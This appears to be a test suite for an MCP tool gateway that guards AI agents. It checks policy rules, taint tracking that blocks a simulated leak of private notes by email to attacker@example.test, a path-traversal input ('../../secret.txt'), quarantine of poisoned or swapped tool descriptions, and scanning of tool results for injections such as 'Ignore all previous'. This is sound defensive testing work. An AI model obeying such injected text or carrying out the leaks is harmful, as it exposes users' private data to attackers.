import assert from "node:assert/strict";
import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { PassThrough } from "node:stream";
import { after, test } from "node:test";
import { type Config, DEFAULT_POLICY, parseConfig } from "../src/config.js";
import { serve } from "../src/cli.js";
import { Gateway } from "../src/gateway.js";
import { Approvals } from "../src/approvals.js";
import type { Message, Response } from "../src/jsonrpc.js";
import { PROTOCOL_VERSION, Upstream } from "../src/upstream.js";
import { makeLock } from "../src/vendor/basilisk/pin.js";
import { RANGE, rig, spec, stopAll, tmp, waitFor } from "./helpers.js";

after(stopAll);

const LABELS = [{ match: "notes__*", labels: ["private"] }, { match: "mail__send_email", labels: ["sink"] }] as never;
const CANARY = "CANARY-NOTES-7f3a91";

test("протокол: initialize, ping, tools/list с пространствами имён, неизвестный метод", async () => {
  const r = await rig(["notes", "mail", "evil"]);
  await r.gw.handle({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-03-26" } });
  await r.gw.handle({ jsonrpc: "2.0", id: 2, method: "ping" });
  await r.gw.handle({ jsonrpc: "2.0", id: 3, method: "tools/list" });
  await r.gw.handle({ jsonrpc: "2.0", id: 4, method: "resources/list" });
  await r.gw.handle({ jsonrpc: "2.0", id: 5, method: "tools/call", params: {} });
  const by = (id: number) => r.out.find((m) => (m as Response).id === id) as Response;
  assert.equal((by(1).result as { protocolVersion: string }).protocolVersion, "2025-03-26");
  assert.deepEqual(by(2).result, {});
  const names = (by(3).result as { tools: { name: string }[] }).tools.map((t) => t.name).sort();
  assert.ok(names.includes("mail__send_email") && names.includes("evil__send_email")); // одноимённые инструменты больше не конфликтуют
  assert.equal(by(4).error?.code, -32601);
  assert.equal(by(5).error?.code, -32602);
  await r.stop();
});

test("вызов проходит к нужному серверу и возвращает результат", async () => {
  const r = await rig(["notes"]);
  const res = await r.call("notes__read_notes", { topic: "keys" });
  assert.equal(res.isError, false);
  assert.ok(res.text.includes(CANARY));
  assert.ok(r.effects().some((e) => e.kind === "private-read"));
  await r.stop();
});

test("неизвестный инструмент, неверные аргументы и недоступный сервер дают понятный отказ", async () => {
  const r = await rig(["notes"]);
  assert.match((await r.call("notes__нет")).text, /неизвестный/);
  assert.match((await r.call("нет_пространства")).text, /неизвестный/);
  assert.match((await r.call("notes__read_notes", [1, 2] as never)).text, /объектом/);
  assert.match((await r.call("notes__read_notes", { topic: "x".repeat(70_000) })).text, /лимита/);
  await r.stop();
});

test("скрытые Unicode-теги: инструмент скрывается, а описания очищаются", async () => {
  const r = await rig(["evil"], { sanitize: { stripInvisible: true, blockDefinitionsAt: "high", scanResults: "off" } });
  const list = r.gw.catalog;
  assert.ok(list.get("evil__get_alerts")?.quarantine);
  assert.match((await r.call("evil__get_alerts", {})).text, /скрыт/);
  assert.equal(list.get("evil__get_weather")?.quarantine, undefined);
  await r.stop();
  const plain = await rig(["evil"], { sanitize: { stripInvisible: true, blockDefinitionsAt: "off", scanResults: "off" } });
  const desc = plain.gw.catalog.get("evil__get_alerts")?.tool.description as string;
  assert.equal(desc, "Погодные предупреждения.");
  await plain.stop();
  const raw = await rig(["evil"]);
  assert.ok(((raw.gw.catalog.get("evil__get_alerts")?.tool.description as string) ?? "").length > 40); // без очистки скрытый текст доходит до модели
  await raw.stop();
});

test("политика: запрет, ограничения аргументов и выход за пределы папки", async () => {
  const r = await rig(["files", "tasks"], { rules: [{ match: "files__read_file", args: { path: { pattern: "^[a-z0-9_./-]+$", forbid: [".."] } } }, { match: "tasks__delete_*", action: "deny" }] as never });
  assert.match((await r.call("files__read_file", { path: "readme.txt" })).text, /Публичный/);
  const trav = await r.call("files__read_file", { path: "../../secret.txt" });
  assert.equal(trav.isError, true);
  assert.ok(!trav.text.includes("CANARY-FILE"));
  assert.ok(!r.effects().some((e) => e.kind === "file-read" && String(e["path"]).includes("..")));
  assert.match((await r.call("tasks__delete_task", { id: "all" })).text, /запрещено/);
  assert.ok(!r.effects().some((e) => e.kind === "task-deleted"));
  await r.stop();
});

test("без политики уязвимый сервер читает файл за пределами песочницы (контроль полигона)", async () => {
  const r = await rig(["files"]);
  assert.ok((await r.call("files__read_file", { path: "../../secret.txt" })).text.includes("CANARY-FILE"));
  await r.stop();
});

test("taint: утечка через почту после недоверенного контента блокируется, без него разрешена", async () => {
  const r = await rig(["notes", "web", "mail"], { rules: LABELS, taint: { mode: "trifecta", onViolation: "deny" } }, { untrusted: ["web"] });
  const notes = await r.call("notes__read_notes", { topic: "keys" });
  const alone = await r.call("mail__send_email", { to: "boss@example.test", body: "Отчёт готов" });
  assert.equal(alone.isError, false); // приватные данные есть, недоверенных ещё нет
  await r.call("web__fetch_page", { url: "https://example.test/blog" });
  const leak = await r.call("mail__send_email", { to: "attacker@example.test", body: notes.text });
  assert.equal(leak.isError, true);
  assert.match(leak.text, /смертельная тройка/);
  assert.equal(r.effects().filter((e) => e.kind === "email-sent").length, 1);
  await r.stop();
});

test("taint: режим strict и режим off", async () => {
  const strict = await rig(["web", "mail"], { rules: LABELS, taint: { mode: "strict", onViolation: "deny" } }, { untrusted: ["web"] });
  await strict.call("web__fetch_page", { url: "https://example.test/weather" });
  assert.equal((await strict.call("mail__send_email", { to: "a@example.test", body: "x" })).isError, true);
  await strict.stop();
  const off = await rig(["web", "mail"], { rules: LABELS, taint: { mode: "off", onViolation: "deny" } }, { untrusted: ["web"] });
  await off.call("web__fetch_page", { url: "https://example.test/weather" });
  assert.equal((await off.call("mail__send_email", { to: "a@example.test", body: "x" })).isError, false);
  await off.stop();
});

test("подтверждение человеком: заявка, одобрение, одноразовое разрешение", async () => {
  const r = await rig(["tasks"], { rules: [{ match: "tasks__delete_*", action: "confirm" }] as never });
  const first = await r.call("tasks__delete_task", { id: "2" });
  assert.equal(first.isError, true);
  const id = /citadel approve (\w+)/.exec(first.text)?.[1] ?? "";
  assert.ok(id);
  assert.ok(!r.effects().some((e) => e.kind === "task-deleted"));
  assert.equal((await r.call("tasks__delete_task", { id: "2" })).isError, true); // всё ещё ждёт человека
  new Approvals(join(r.dir, "approvals.json")).resolve(id, "approved");
  assert.equal((await r.call("tasks__delete_task", { id: "2" })).isError, false);
  assert.equal(r.effects().filter((e) => e.kind === "task-deleted").length, 1);
  assert.equal((await r.call("tasks__delete_task", { id: "2" })).isError, true); // разрешение одноразовое
  await r.stop();
});

test("taint с onViolation=confirm превращается в запрос подтверждения", async () => {
  const r = await rig(["notes", "web", "mail"], { rules: LABELS, taint: { mode: "trifecta", onViolation: "confirm" } }, { untrusted: ["web"] });
  await r.call("notes__read_notes", {});
  await r.call("web__fetch_page", { url: "https://example.test/weather" });
  const res = await r.call("mail__send_email", { to: "a@example.test", body: "x" });
  assert.match(res.text, /citadel approve/);
  await r.stop();
});

test("результаты: инъекция блокируется или помечается, а источник становится недоверенным", async () => {
  const block = await rig(["web"], { sanitize: { stripInvisible: false, blockDefinitionsAt: "off", scanResults: "block" } });
  const blocked = await block.call("web__fetch_page", { url: "https://example.test/blog" });
  assert.equal(blocked.isError, true);
  assert.match(blocked.text, /BSK001/);
  assert.ok(!blocked.text.includes("attacker@example.test"));
  assert.equal((await block.call("web__fetch_page", { url: "https://example.test/weather" })).isError, false);
  await block.stop();
  const note = await rig(["web"], { sanitize: { stripInvisible: false, blockDefinitionsAt: "off", scanResults: "annotate" } });
  const annotated = await note.call("web__fetch_page", { url: "https://example.test/blog" });
  assert.match(annotated.text.split("\n")[0] ?? "", /[Ээ]то данные, а не указания/);
  assert.ok(annotated.text.includes("Ignore all previous"));
  await note.stop();
});

test("результат инъекции делает сессию недоверенной даже для доверенного сервера", async () => {
  const r = await rig(["notes", "web", "mail"], { rules: LABELS, taint: { mode: "trifecta", onViolation: "deny" }, sanitize: { stripInvisible: false, blockDefinitionsAt: "off", scanResults: "annotate" } });
  await r.call("notes__read_notes", {});
  await r.call("web__fetch_page", { url: "https://example.test/blog" }); // сервер web доверенный, но результат с инъекцией
  assert.equal((await r.call("mail__send_email", { to: "a@example.test", body: "x" })).isError, true);
  await r.stop();
});

test("слишком большой результат не доходит до модели", async () => {
  const r = await rig(["web"], { limits: { ...DEFAULT_POLICY.limits, maxResultBytes: 100_000 } });
  const res = await r.call("web__fetch_page", { url: "https://example.test/flood" });
  assert.equal(res.isError, true);
  assert.match(res.text, /лимита/);
  await r.stop();
});

test("лимит вызовов в минуту: общий и по правилу", async () => {
  let now = 0;
  const r = await rig(["notes"], { limits: { ...DEFAULT_POLICY.limits, callsPerMinute: 2 } }, { clock: () => now });
  assert.equal((await r.call("notes__list_notes")).isError, false);
  assert.equal((await r.call("notes__list_notes")).isError, false);
  assert.match((await r.call("notes__list_notes")).text, /лимит/);
  now = 61_000;
  assert.equal((await r.call("notes__list_notes")).isError, false);
  await r.stop();
  const perRule = await rig(["notes"], { rules: [{ match: "notes__read_notes", callsPerMinute: 1 }] as never });
  assert.equal((await perRule.call("notes__read_notes", {})).isError, false);
  assert.match((await perRule.call("notes__read_notes", {})).text, /лимит/);
  assert.equal((await perRule.call("notes__list_notes", {})).isError, false);
  await perRule.stop();
});

test("закрепление: подмена определения после одобрения скрывает инструмент (rug pull)", async () => {
  const dir = tmp();
  const first = await rig(["evil"], {}, { dir });
  const lock = join(dir, "citadel.lock.json");
  writeFileSync(lock, JSON.stringify(makeLock(first.gw.inventory())));
  await first.stop();
  const r = await rig(["evil"], { sanitize: { stripInvisible: true, blockDefinitionsAt: "off", scanResults: "off" } }, { dir: tmp(), pin: lock });
  assert.equal(r.gw.catalog.get("evil__get_weather")?.quarantine, undefined);
  assert.equal(r.gw.catalog.get("evil__get_alerts")?.quarantine, undefined);
  const notifications = () => r.out.filter((m) => (m as { method?: string }).method === "notifications/tools/list_changed").length;
  await r.call("evil__get_weather", { city: "Минск" }); // после первого вызова сервер подменяет описание
  await waitFor(() => notifications() > 0);
  assert.match(r.gw.catalog.get("evil__get_weather")?.quarantine ?? "", /подмена/);
  assert.match((await r.call("evil__get_weather", { city: "Минск" })).text, /скрыт/);
  assert.ok(r.gw.audit.events.some((e) => e.type === "definition" && String(e["quarantine"]).includes("изменилось")));
  await r.stop();
});

test("закрепление: новый инструмент вне закреплённого набора скрывается", async () => {
  const dir = tmp();
  const lock = join(dir, "lock.json");
  writeFileSync(lock, JSON.stringify({ version: 1, tools: {}, servers: {} }));
  const r = await rig(["notes"], {}, { dir, pin: lock });
  assert.match(r.gw.catalog.get("notes__read_notes")?.quarantine ?? "", /нет в закреплённом/);
  await r.stop();
});

test("журнал аудита: решения записаны, значения аргументов нет", async () => {
  const r = await rig(["notes", "mail"], { rules: [{ match: "mail__*", action: "deny" }] as never });
  await r.call("notes__read_notes", { topic: "УНИКАЛЬНАЯ-ТЕМА" });
  await r.call("mail__send_email", { to: "x@example.test", body: "СЕКРЕТНОЕ-ТЕЛО-ПИСЬМА" });
  await r.stop();
  const text = readFileSync(join(r.dir, "audit.jsonl"), "utf8");
  assert.ok(!text.includes("УНИКАЛЬНАЯ-ТЕМА") && !text.includes("СЕКРЕТНОЕ-ТЕЛО-ПИСЬМА"));
  const events = text.trim().split("\n").map((l) => JSON.parse(l) as { type: string; decision?: string; tool?: string });
  assert.ok(events.some((e) => e.type === "call" && e.decision === "allow" && e.tool === "notes__read_notes"));
  assert.ok(events.some((e) => e.type === "call" && e.decision === "deny" && e.tool === "mail__send_email"));
  assert.equal(events[0]?.type, "start");
});

test("один упавший сервер не мешает остальным, а если упали все — ошибка", async () => {
  const dir = tmp();
  const config: Config = parseConfig({ servers: { ok: { command: process.execPath, args: [RANGE("notes")] }, broken: { command: "/нет/такой/команды" } } });
  const gw = new Gateway({ config, emit: () => {}, log: () => {} });
  await gw.start();
  assert.ok(gw.catalog.has("ok__read_notes"));
  assert.ok(gw.audit.events.some((e) => e.type === "server-failed" && e["server"] === "broken"));
  await gw.stop();
  const allBad = new Gateway({ config: parseConfig({ servers: { a: { command: "/нет/1" }, b: { command: "/нет/2" } } }), emit: () => {}, log: () => {} });
  await assert.rejects(allBad.start(), /ни один сервер/);
  void dir;
});

test("upstream: запросы сервера к клиенту (sampling, roots) отклоняются", async () => {
  const script = `
    const rl = require('readline').createInterface({ input: process.stdin });
    const send = (m) => process.stdout.write(JSON.stringify(m) + '\\n');
    rl.on('line', (l) => {
      const m = JSON.parse(l);
      if (m.method === 'initialize') { send({ jsonrpc: '2.0', id: m.id, result: { protocolVersion: '2025-06-18', capabilities: {}, serverInfo: { name: 's', version: '1' } } }); send({ jsonrpc: '2.0', id: 900, method: 'sampling/createMessage', params: {} }); }
      if (m.id === 900) process.stderr.write('ответ на sampling: ' + JSON.stringify(m.error) + '\\n');
    });`;
  const refused: string[] = [];
  const stderr: string[] = [];
  const up = new Upstream("fake", { command: process.execPath, args: ["-e", script], env: {}, inheritEnv: false, trust: "trusted" }, { timeoutMs: 3000, onRefusedRequest: (m) => refused.push(m), onStderr: (l) => stderr.push(l) });
  await up.start();
  await waitFor(() => stderr.some((l) => l.includes("ответ на sampling")));
  assert.deepEqual(refused, ["sampling/createMessage"]);
  assert.ok(stderr.some((l) => l.includes("-32601")));
  await up.close();
});

test("upstream: таймаут, падение процесса, плохая форма tools/list", async () => {
  const hang = `const rl=require('readline').createInterface({input:process.stdin});rl.on('line',(l)=>{const m=JSON.parse(l);if(m.method==='initialize')process.stdout.write(JSON.stringify({jsonrpc:'2.0',id:m.id,result:{}})+'\\n');});`;
  const up = new Upstream("slow", { command: process.execPath, args: ["-e", hang], env: {}, inheritEnv: false, trust: "trusted" }, { timeoutMs: 300 });
  await up.start();
  await assert.rejects(up.listTools(), /нет ответа/);
  await up.close();
  const die = `const rl=require('readline').createInterface({input:process.stdin});rl.on('line',(l)=>{const m=JSON.parse(l);if(m.method==='initialize'){process.stdout.write(JSON.stringify({jsonrpc:'2.0',id:m.id,result:{}})+'\\n');}else if(m.method==='tools/list'){process.exit(3);}});`;
  const dying = new Upstream("dies", { command: process.execPath, args: ["-e", die], env: {}, inheritEnv: false, trust: "trusted" }, { timeoutMs: 3000 });
  await dying.start();
  await assert.rejects(dying.listTools(), /завершился/);
  const weird = `const rl=require('readline').createInterface({input:process.stdin});rl.on('line',(l)=>{const m=JSON.parse(l);const r=(x)=>process.stdout.write(JSON.stringify({jsonrpc:'2.0',id:m.id,result:x})+'\\n');if(m.method==='initialize')r({});else if(m.method==='tools/list')r({tools:'нет'});});`;
  const bad = new Upstream("weird", { command: process.execPath, args: ["-e", weird], env: {}, inheritEnv: false, trust: "trusted" }, { timeoutMs: 3000 });
  await bad.start();
  await assert.rejects(bad.listTools(), /неверную форму/);
  await bad.close();
  assert.equal(PROTOCOL_VERSION.length, 10);
});

test("stdio: serve принимает строки, отвечает на запросы и завершается вместе с клиентом", async () => {
  const dir = tmp();
  const log = join(dir, "e.jsonl");
  writeFileSync(log, "");
  mkdirSync(join(dir, "root"));
  const config = parseConfig({ servers: { notes: { command: process.execPath, args: [RANGE("notes")], env: { RANGE_LOG: log } } }, policy: {} });
  const input = new PassThrough();
  const output = new PassThrough();
  const lines: Message[] = [];
  let buf = "";
  output.on("data", (c: Buffer) => {
    buf += c.toString();
    let i;
    while ((i = buf.indexOf("\n")) >= 0) {
      lines.push(JSON.parse(buf.slice(0, i)) as Message);
      buf = buf.slice(i + 1);
    }
  });
  const done = serve(config, input, output, () => {});
  input.write('{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}\n');
  input.write("мусор вместо JSON\n");
  input.write('{"jsonrpc":"2.0","id":2,"method":"tools/list"}\n');
  input.write('{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"notes__read_notes","arguments":{"topic":"keys"}}}\n');
  await waitFor(() => lines.length >= 4);
  input.end();
  await done;
  const ids = lines.map((m) => (m as Response).id);
  assert.ok(ids.includes(1) && ids.includes(2) && ids.includes(3) && ids.includes(null));
  const call = lines.find((m) => (m as Response).id === 3) as Response;
  assert.ok(JSON.stringify(call.result).includes(CANARY));
  void spec;
});
